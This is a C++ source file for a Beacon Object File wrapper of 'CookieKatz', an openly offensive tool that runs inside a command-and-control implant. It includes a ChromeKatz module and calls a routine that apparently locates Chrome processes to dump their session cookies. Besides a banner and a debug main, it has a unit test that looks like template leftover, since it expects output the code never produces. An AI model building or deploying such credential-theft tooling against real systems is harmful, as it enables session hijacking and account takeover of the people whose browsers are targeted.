#include <Windows.h>
#include "base\helpers.h"

/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

#include "ChromeKatz/Process.cpp"

extern "C" {
#include "beacon.h"

    //This is important!
    void banner() {
        BeaconPrintf(CALLBACK_OUTPUT, " _____             _    _      _   __      _       \n");
        BeaconPrintf(CALLBACK_OUTPUT, "/  __ \\           | |  (_)    | | / /     | |      \n");
        BeaconPrintf(CALLBACK_OUTPUT, "| /  \\/ ___   ___ | | ___  ___| |/ /  __ _| |_ ____\n");
        BeaconPrintf(CALLBACK_OUTPUT, "| |    / _ \\ / _ \\| |/ / |/ _ \\    \\ / _` | __|_  /\n");
        BeaconPrintf(CALLBACK_OUTPUT, "| \\__/\\ (_) | (_) |   <| |  __/ |\\  \\ (_| | |_ / / \n");
        BeaconPrintf(CALLBACK_OUTPUT, " \\____/\\___/ \\___/|_|\\_\\_|\\___\\_| \\_/\\__,_|\\__/___|\n");
        BeaconPrintf(CALLBACK_OUTPUT, " By Meckazin                      github.com/Meckazin \n");
    };

    void go(char* args, int len) {
        banner();
        BeaconPrintf(CALLBACK_OUTPUT, "CookieKatz!\n");
        FindAllSuitableProcesses();
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Done\n");
    }
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    bof::runMocked<>(go);
    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got =
        bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
    };
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif